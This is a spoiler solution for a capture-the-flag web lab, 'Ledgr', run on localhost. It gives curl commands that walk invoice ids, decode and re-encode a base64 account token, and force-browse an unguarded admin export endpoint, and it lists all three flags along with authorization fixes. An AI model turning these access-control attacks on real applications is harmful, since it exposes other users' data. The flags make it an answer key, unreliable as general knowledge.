# 🚩 Ledgr — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

Sign in first as `alice` / `hunter2`. Grab your session cookie if you want to work from
the terminal:

```bash
sid=$(curl -s -i -X POST http://localhost:8089/login \
  --data 'user=alice&pw=hunter2' | grep -i '^set-cookie' | sed 's/.*sid=\([^;]*\).*/\1/')
echo "sid=$sid"
```

## Flag 1 — Sequential IDOR (`FLAG{id0r_s3qu3nt14l_1nv01c3}`)

Your dashboard links to your own invoices (`#1002`, `#1005`). `/invoice/<id>` fetches by
id and never checks ownership. Walk the ids downward:

```bash
for i in 1001 1002 1003 1004 1005; do
  echo "== $i =="; curl -s -b "sid=$sid" http://localhost:8089/invoice/$i | grep -o 'FLAG{[^}]*}'
done
```

`/invoice/1001` is **Bob's** invoice; its note carries `FLAG{id0r_s3qu3nt14l_1nv01c3}`.
In a browser: just visit http://localhost:8089/invoice/1001.

**Lesson:** the object was addressed by a guessable id and the server trusted the
request. Fix: `if inv.owner != session.uid: return 403` on every object fetch.

## Flag 2 — IDOR behind a base64 token (`FLAG{id0r_b64_t0k3n_n0t_4uthz}`)

Your statement link is `/statement?token=YWNjdDoy`. That "random" token is URL-safe
base64:

```bash
echo 'YWNjdDoy' | base64 -d      # -> acct:2   (Alice is account 2)
```

Point it at account **1** (the admin/master billing account) and re-encode:

```bash
tok=$(printf 'acct:1' | base64)          # -> YWNjdDox
curl -s -b "sid=$sid" "http://localhost:8089/statement?token=$tok" | grep -o 'FLAG{[^}]*}'
```

The admin statement's detail field leaks `FLAG{id0r_b64_t0k3n_n0t_4uthz}`. (Accounts 3
and 4 are Bob and Carol — also readable, no flag.)

**Lesson:** base64 is an *encoding*, not a secret. Wrapping an id in it changes nothing
about authorization. Fix: same ownership check as flag 1, and if a reference must be
unguessable use a random, server-side-mapped token — not encode(id).

## Flag 3 — Broken function-level authorization (`FLAG{br0k3n_funcl3v3l_4dm1n_3xp0rt}`)

As Alice, `/admin` returns **403 — Admins only** (the page is guarded correctly, which
is the trap: it *feels* locked down). But where do admin tools live? `robots.txt` says
so:

```bash
curl -s http://localhost:8089/robots.txt
# User-agent: *
# Disallow: /admin/
# Disallow: /admin/export      <-- the action endpoint
```

`/admin/export` is the button's action — and it never checks role. Call it directly as
plain-old Alice:

```bash
curl -s -b "sid=$sid" http://localhost:8089/admin/export | grep -o 'FLAG{[^}]*}'
```

→ `FLAG{br0k3n_funcl3v3l_4dm1n_3xp0rt}` (plus a dump of all accounts and their roles).
In a browser: navigate straight to http://localhost:8089/admin/export.

**Lesson:** hiding the button and guarding the page are not access control. Authorization
must be enforced on **every function that does the work**, server-side, close to the
action. This is OWASP "Broken Function Level Authorization" — protecting the UI/read
path and forgetting the write/action path is one of the most common real bugs.

> Related real-world variant you'll meet: a **client-trusted role** — e.g. a cookie or
> JWT claim `role=user` the server believes. Flip it to `admin` and you're in. Ledgr
> keeps role server-side to keep this flag purely about the *missing endpoint check*,
> but watch for the tamperable-role version in the wild.

---

### Full flag list
1. `FLAG{id0r_s3qu3nt14l_1nv01c3}`        — sequential IDOR, change the invoice id
2. `FLAG{id0r_b64_t0k3n_n0t_4uthz}`       — decode/tamper the base64 statement token
3. `FLAG{br0k3n_funcl3v3l_4dm1n_3xp0rt}`  — force-browse the unprotected admin action

### The one fix that kills all three
Enforce authorization on the **server** for **every object and every action**: check
that the authenticated user owns the object (flags 1–2) or holds the required role
(flag 3), on the endpoint that does the work — never rely on guessable ids being
secret, encodings being opaque, or UI hiding the control.
